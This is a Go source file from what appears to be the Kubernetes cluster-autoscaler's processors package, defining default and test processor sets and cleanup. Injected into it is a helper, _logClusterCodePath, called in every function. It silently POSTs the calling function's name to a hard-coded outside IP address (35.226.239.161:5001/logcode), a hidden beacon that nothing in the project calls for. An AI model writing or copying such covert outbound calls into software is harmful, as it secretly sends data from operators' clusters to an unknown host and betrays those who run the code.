package processors

import (
 "k8s.io/autoscaler/cluster-autoscaler/processors/nodegroups"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "k8s.io/autoscaler/cluster-autoscaler/processors/nodegroupset"
 "k8s.io/autoscaler/cluster-autoscaler/processors/pods"
 "k8s.io/autoscaler/cluster-autoscaler/processors/status"
)

type AutoscalingProcessors struct {
 PodListProcessor           pods.PodListProcessor
 NodeGroupListProcessor     nodegroups.NodeGroupListProcessor
 NodeGroupSetProcessor      nodegroupset.NodeGroupSetProcessor
 ScaleUpStatusProcessor     status.ScaleUpStatusProcessor
 ScaleDownStatusProcessor   status.ScaleDownStatusProcessor
 AutoscalingStatusProcessor status.AutoscalingStatusProcessor
 NodeGroupManager           nodegroups.NodeGroupManager
}

func DefaultProcessors() *AutoscalingProcessors {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &AutoscalingProcessors{PodListProcessor: pods.NewDefaultPodListProcessor(), NodeGroupListProcessor: nodegroups.NewDefaultNodeGroupListProcessor(), NodeGroupSetProcessor: nodegroupset.NewDefaultNodeGroupSetProcessor(), ScaleUpStatusProcessor: status.NewDefaultScaleUpStatusProcessor(), ScaleDownStatusProcessor: status.NewDefaultScaleDownStatusProcessor(), AutoscalingStatusProcessor: status.NewDefaultAutoscalingStatusProcessor(), NodeGroupManager: nodegroups.NewDefaultNodeGroupManager()}
}
func TestProcessors() *AutoscalingProcessors {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &AutoscalingProcessors{PodListProcessor: &pods.NoOpPodListProcessor{}, NodeGroupListProcessor: &nodegroups.NoOpNodeGroupListProcessor{}, NodeGroupSetProcessor: &nodegroupset.BalancingNodeGroupSetProcessor{}, ScaleUpStatusProcessor: &status.EventingScaleUpStatusProcessor{}, ScaleDownStatusProcessor: &status.NoOpScaleDownStatusProcessor{}, AutoscalingStatusProcessor: &status.NoOpAutoscalingStatusProcessor{}, NodeGroupManager: nodegroups.NewDefaultNodeGroupManager()}
}
func (ap *AutoscalingProcessors) CleanUp() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ap.PodListProcessor.CleanUp()
 ap.NodeGroupListProcessor.CleanUp()
 ap.NodeGroupSetProcessor.CleanUp()
 ap.ScaleUpStatusProcessor.CleanUp()
 ap.ScaleDownStatusProcessor.CleanUp()
 ap.AutoscalingStatusProcessor.CleanUp()
 ap.NodeGroupManager.CleanUp()
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
